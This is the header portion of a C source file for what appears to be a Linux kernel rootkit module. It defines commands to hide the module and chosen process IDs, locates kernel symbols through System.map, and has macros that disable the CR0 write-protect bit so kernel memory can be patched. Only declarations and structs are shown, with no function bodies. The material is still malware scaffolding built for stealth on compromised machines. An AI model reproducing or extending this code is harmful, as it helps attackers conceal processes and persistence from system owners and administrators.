#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>
#include <linux/kallsyms.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>     /* kmalloc */

/* WTF, it compiles without these */
// #include <linux/unistd.h>
// #include <asm/uaccess.h>
// #include <asm/paravirt.h>
//#include <linux/proc_ns.h>
//#include <linux/spinlock.h>
//#include <linux/atomic.h>
//#include <linux/binfmts.h>
//#include <linux/cred.h>

MODULE_LICENSE("GPL");

#define MODULE_NAME "ker_mod"
#define MAX_HIDDEN_PIDS 5
#define MAX_PID_LENGTH 6

#define HIDE_MOD_CMD "hide"
#define SHOW_MOD_CMD "show"
#define HIDE_PID_CMD "hpid"
#define SHOW_PID_CMD "spid"

#define PROC_V "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_VERSION_LEN   256

#define GPF_DISABLE() write_cr0(read_cr0() & (~0x10000))
#define GPF_ENABLE() write_cr0(read_cr0() | 0x10000)

/* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;
		atomic_t in_use;
		struct completion *pde_unload_completion;
		struct list_head pde_openers;
		spinlock_t pde_unload_lock;
		u8 namelen;
		char name[];
};

/* Re-writing linux_dirent since there is no .h with it... */
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

static int procfs_init(void);
void module_hide(void);
void module_show(void);
